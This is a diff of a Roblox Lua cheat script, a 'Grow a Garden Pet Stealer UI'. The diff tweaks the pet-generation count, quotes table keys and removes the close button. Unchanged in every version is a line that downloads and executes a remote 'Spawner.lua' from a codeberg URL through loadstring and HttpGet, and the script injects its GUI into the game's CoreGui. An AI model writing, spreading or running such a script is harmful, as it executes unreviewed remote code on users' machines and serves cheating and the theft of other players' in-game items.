@@ -1,4 +1,4 @@
--- Grow a Garden Pet Stealer UI (Simple Edition with Your Suggestions)
+-- Grow a Garden Pet Stealer UI (Simple & Working Edition)
 local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
 
 local allPets = {
@@ -7,13 +7,13 @@ local allPets = {
 }
 
 local petDisplayNames = {
-    Kitsune = "Kitsune",
-    Raccoon = "Raccoon",
+    ["Kitsune"] = "Kitsune",
+    ["Raccoon"] = "Raccoon",
     ["Corrupted Kitsune"] = "Corrupted Kitsune",
-    Dragonfly = "Dragonfly",
+    ["Dragonfly"] = "Dragonfly",
     ["T-Rex"] = "T-Rex",
     ["Disco Bee"] = "Disco Bee",
-    Butterfly = "Butterfly"
+    ["Butterfly"] = "Butterfly"
 }
 
 local ScreenGui = Instance.new("ScreenGui", game:GetService("CoreGui"))
@@ -37,16 +37,6 @@ Main.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
 Main.Active = true
 Main.Draggable = true
 Main.BorderSizePixel = 0
-
-local Close = Instance.new("TextButton", Main)
-Close.Text = "X"
-Close.Size = UDim2.new(0, 30, 0, 30)
-Close.Position = UDim2.new(1, -35, 0, 5)
-Close.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
-Close.TextColor3 = Color3.new(1, 1, 1)
-Close.MouseButton1Click:Connect(function()
-    ScreenGui.Enabled = false
-end)
 
 local Sidebar = Instance.new("Frame", Main)
 Sidebar.Size = UDim2.new(0.3, 0, 1, 0)
@@ -76,10 +66,11 @@ local function showMessage(text)
     end)
 end
 
+-- ✅ ONLY CHANGE: Generate 4-5 pets instead of 1
 local function generatePetSet()
     local pets = {}
     local available = { unpack(allPets) }
-    local total = math.random(3, 4)
+    local total = math.random(4, 5)
     for i = 1, total do
         if #available == 0 then break end
         local index = math.random(1, #available)
